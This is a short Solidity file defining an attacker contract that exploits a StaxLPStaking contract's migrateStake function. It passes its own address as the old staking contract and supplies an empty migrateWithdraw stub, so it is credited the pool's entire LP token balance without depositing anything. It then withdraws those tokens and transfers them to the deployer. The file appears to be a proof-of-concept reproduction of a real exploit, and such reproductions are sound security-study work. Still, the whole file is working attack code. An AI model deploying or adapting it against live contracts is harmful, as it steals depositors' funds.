// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IStaxLPStaking {
    function migrateStake(address oldStaking, uint256 amount) external;

    function withdrawAll(bool claim) external;
}

contract TAttacker {
    address private immutable attacker;
    IERC20 private immutable token;
    IStaxLPStaking private immutable stakingContract;

    constructor(address _lpTokenAddress, address _staking) {
        attacker = msg.sender;
        token = IERC20(_lpTokenAddress);
        stakingContract = IStaxLPStaking(_staking);
    }

 function exploit() public {
    // Use the vulnerability to stake the entire balance of the StaxLPStaking
    uint256 stakingContractBalance = token.balanceOf(address(stakingContract));
    stakingContract.migrateStake(address(this), stakingContractBalance);
    
    // Now just withdraw the tokens
    stakingContract.withdrawAll(false);

    // Now transfer them to our EOA
    token.transfer(msg.sender, stakingContractBalance);
  }

  // Our `migrateWithdraw()` function does nothing
  function migrateWithdraw(address, uint256) external {}




}
